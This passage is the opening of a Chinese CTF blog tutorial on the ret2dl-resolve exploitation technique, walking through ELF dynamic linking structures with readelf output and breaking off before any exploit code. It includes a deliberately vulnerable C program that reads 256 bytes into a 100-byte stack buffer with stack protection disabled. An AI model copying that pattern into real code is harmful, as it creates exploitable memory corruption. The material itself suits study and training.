<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
  
  <title>A trip of ret2dl-resolve | AssassinQ</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="keywords" content="ctfpwn">
  
  
  
  
  <meta name="description" content="一步步了解dl-resolve的利用方法。">
<meta name="keywords" content="ctf,pwn">
<meta property="og:type" content="article">
<meta property="og:title" content="A trip of ret2dl-resolve">
<meta property="og:url" content="https://qianfei11.github.io/2019/08/06/A-trip-of-ret2dl-resolve/index.html">
<meta property="og:site_name" content="AssassinQ">
<meta property="og:description" content="一步步了解dl-resolve的利用方法。">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2019-08-26T05:55:20.464Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="A trip of ret2dl-resolve">
<meta name="twitter:description" content="一步步了解dl-resolve的利用方法。">
  
    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
  
  <link rel="icon" href="/css/images/favicon.ico">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
    
  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">

  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css">
  <link rel="stylesheet" href="/css/fashion.css">
  <link rel="stylesheet" href="/css/glyphs.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->

</head>
</html>


  <body data-spy="scroll" data-target="#toc" data-offset="50">


  


<!-- hexo-inject:begin --><!-- hexo-inject:end --><header id="allheader" class="site-header" role="banner">
  <div class="clearfix container">
      <div class="site-branding">

          <h1 class="site-title">
            
              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
            
          </h1>
          
          
            <div class="site-description">ZJGSU-IS-17</div>
          
            
          <nav id="main-navigation" class="main-navigation" role="navigation">
            <a class="nav-open">Menu</a>
            <a class="nav-close">Close</a>

            <div class="clearfix sf-menu">
              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
                    
              </ul>
            </div>
          </nav>

      </div>
  </div>
</header>


  <div id="container">
    <div id="wrap">
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-A-trip-of-ret2dl-resolve" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      A trip of ret2dl-resolve
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2019/08/06/A-trip-of-ret2dl-resolve/" class="article-date">
	  <time datetime="2019-08-06T08:04:26.000Z" itemprop="datePublished">August 6, 2019</time>
	</a>

       
      

	  |
	  4.8k words
	  |
	  27 minute(s) to read
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>一步步了解<code>dl-resolve</code>的利用方法。</p>
<a id="more"></a>
<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>通过利用<code>ret2dl-resolve</code>绕过 NX 和 ASLR 的限制。</p>
<p>例子如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>] = <span class="string">"Return to dl_runtime_resolve!\n"</span>;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc -o bof -m32 -fno-stack-protector bof.c</span></span><br></pre></td></tr></table></figure>
<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><h2 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h2><p>ELF 可执行文件由 ELF 头部，程序头部表和其对应的段，节头部表和其对应的节组成，源码在<a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html" target="_blank" rel="noopener">elf.h</a>中实现</p>
<p>一个参与动态链接的可执行文件，它的程序头部表包含类型为<code>PT_DYNAMIC</code>的段，<code>PT_DYNAMIC</code>又包含<code>.dynamic</code>节，程序头的结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword        d_tag;                        <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      Elf32_Word d_val;                        <span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;                        <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword        d_tag;                        <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      Elf64_Xword d_val;                <span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;                        <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure>
<p>执行<code>readelf -d ./bof</code>，其中<code>Tag</code>对应每一个节，比如<code>JMPREL</code>对应着<code>.rel.plt</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">λ readelf -d ./bof</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0xf14 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x8048358</span><br><span class="line"> 0x0000000d (FINI)                       0x8048634</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x8049f08</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x8049f0c</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x80481ac</span><br><span class="line"> 0x00000005 (STRTAB)                     0x8048278</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x80481d8</span><br><span class="line"> 0x0000000a (STRSZ)                      107 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x804a000</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   40 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x8048330</span><br><span class="line"> 0x00000011 (REL)                        0x8048318</span><br><span class="line"> 0x00000012 (RELSZ)                      24 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x80482f8</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x80482e4</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure>
<p>节中包含目标文件的所有信息，节的结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Section header.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word        sh_name;                <span class="comment">/* Section name (string tbl index) */</span></span><br><span class="line">  Elf32_Word        sh_type;                <span class="comment">/* Section type */</span></span><br><span class="line">  Elf32_Word        sh_flags;                <span class="comment">/* Section flags */</span></span><br><span class="line">  Elf32_Addr        sh_addr;                <span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">  Elf32_Off        sh_offset;                <span class="comment">/* Section file offset */</span></span><br><span class="line">  Elf32_Word        sh_size;                <span class="comment">/* Section size in bytes */</span></span><br><span class="line">  Elf32_Word        sh_link;                <span class="comment">/* Link to another section */</span></span><br><span class="line">  Elf32_Word        sh_info;                <span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf32_Word        sh_addralign;                <span class="comment">/* Section alignment */</span></span><br><span class="line">  Elf32_Word        sh_entsize;                <span class="comment">/* Entry size if section holds table */</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word        sh_name;                <span class="comment">/* Section name (string tbl index) */</span></span><br><span class="line">  Elf64_Word        sh_type;                <span class="comment">/* Section type */</span></span><br><span class="line">  Elf64_Xword        sh_flags;                <span class="comment">/* Section flags */</span></span><br><span class="line">  Elf64_Addr        sh_addr;                <span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">  Elf64_Off        sh_offset;                <span class="comment">/* Section file offset */</span></span><br><span class="line">  Elf64_Xword        sh_size;                <span class="comment">/* Section size in bytes */</span></span><br><span class="line">  Elf64_Word        sh_link;                <span class="comment">/* Link to another section */</span></span><br><span class="line">  Elf64_Word        sh_info;                <span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf64_Xword        sh_addralign;                <span class="comment">/* Section alignment */</span></span><br><span class="line">  Elf64_Xword        sh_entsize;                <span class="comment">/* Entry size if section holds table */</span></span><br><span class="line">&#125; Elf64_Shdr;</span><br></pre></td></tr></table></figure>
<p>执行<code>readelf -S ./bof</code>，列出了该<code>ELF</code>的 31 个节区：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">λ readelf -S ./bof</span><br><span class="line">There are 31 section headers, starting at offset 0x18a4:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000a0 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          08048278 000278 00006b 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          080482e4 0002e4 000014 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         080482f8 0002f8 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             08048318 000318 000018 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             08048330 000330 000028 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        08048358 000358 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        08048380 000380 000060 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        080483e0 0003e0 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        080483f0 0003f0 000242 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        08048634 000634 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        08048648 000648 000008 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        08048650 000650 000034 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        08048684 000684 0000f4 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000020 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a020 001020 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a040 001028 00000c 00  WA  0   0 32</span><br><span class="line">  [27] .comment          PROGBITS        00000000 001028 000035 01  MS  0   0  1</span><br><span class="line">  [28] .shstrtab         STRTAB          00000000 001798 00010a 00      0   0  1</span><br><span class="line">  [29] .symtab           SYMTAB          00000000 001060 0004b0 10     30  47  4</span><br><span class="line">  [30] .strtab           STRTAB          00000000 001510 000288 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure>
<p>其中类型为 REL 的节区包含重定位表项，结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Relocation table entry without addend (in section of type SHT_REL).  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr        r_offset;                <span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word        r_info;                        <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"><span class="comment">/* I have seen two different definitions of the Elf64_Rel and</span></span><br><span class="line"><span class="comment">   Elf64_Rela structures, so we'll leave them out until Novell (or</span></span><br><span class="line"><span class="comment">   whoever) gets their act together.  */</span></span><br><span class="line"><span class="comment">/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr        r_offset;                <span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword        r_info;                        <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br></pre></td></tr></table></figure>
<p>执行<code>readelf -r ./bof</code>，其中<code>.rel.plt</code>节用于函数重定位，<code>.rel.dyn</code>节用于变量重定位：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">λ readelf -r ./bof</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">'.rel.dyn'</span> at offset 0x318 contains 3 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line">0804a040  00000905 R_386_COPY        0804a040   stdin@GLIBC_2.0</span><br><span class="line">0804a044  00000705 R_386_COPY        0804a044   stdout@GLIBC_2.0</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">'.rel.plt'</span> at offset 0x330 contains 5 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0</span><br><span class="line">0804a010  00000207 R_386_JUMP_SLOT   00000000   <span class="built_in">read</span>@GLIBC_2.0</span><br><span class="line">0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0</span><br><span class="line">0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0</span><br></pre></td></tr></table></figure>
<p>以<code>read</code>为例，<code>read</code>函数的<code>r_offset为=0x0804a010</code>，<code>r_info=0x00000207</code></p>
<p><code>.got</code>节保存全局变量偏移表，<code>.got.plt</code>节保存全局函数偏移表。<code>.got.plt</code>对应着<code>Elf32_Rel</code>结构中<code>r_offset</code>的值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Symbol table entry.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word        st_name;                <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr        st_value;                <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word        st_size;                <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        st_info;                <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        st_other;                <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section        st_shndx;                <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word        st_name;                <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        st_info;                <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;                <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section        st_shndx;                <span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr        st_value;                <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword        st_size;                <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure>
<p><code>.dynsym</code>节包含了动态链接符号表。<code>Elf32_Sym[num]</code>中的<code>num</code>对应着<code>ELF32_R_SYM(Elf32_Rel-&gt;r_info)</code></p>
<p>以<code>read</code>为例，<code>read</code>的索引值为<code>ELF32_R_SYM(Elf32_Rel-&gt;r_info)=ELF32_R_SYM(0x00000207)=0x00000207&gt;&gt;8=2</code>，所以<code>Elf32_Sym[2]</code>保存着<code>read</code>的符号表信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">λ readelf -s ./bof</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">'.dynsym'</span> contains 10 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@GLIBC_2.0 (2)</span><br><span class="line">     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND <span class="built_in">read</span>@GLIBC_2.0 (2)</span><br><span class="line">     3: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.0 (2)</span><br><span class="line">     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)</span><br><span class="line">     6: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.0 (2)</span><br><span class="line">     7: 0804a044     4 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.0 (2)</span><br><span class="line">     8: 0804864c     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used</span><br><span class="line">     9: 0804a040     4 OBJECT  GLOBAL DEFAULT   26 stdin@GLIBC_2.0 (2)</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">'.symtab'</span> contains 75 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 08048154     0 SECTION LOCAL  DEFAULT    1</span><br><span class="line">     2: 08048168     0 SECTION LOCAL  DEFAULT    2</span><br><span class="line">     3: 08048188     0 SECTION LOCAL  DEFAULT    3</span><br><span class="line">     4: 080481ac     0 SECTION LOCAL  DEFAULT    4</span><br><span class="line">     5: 080481d8     0 SECTION 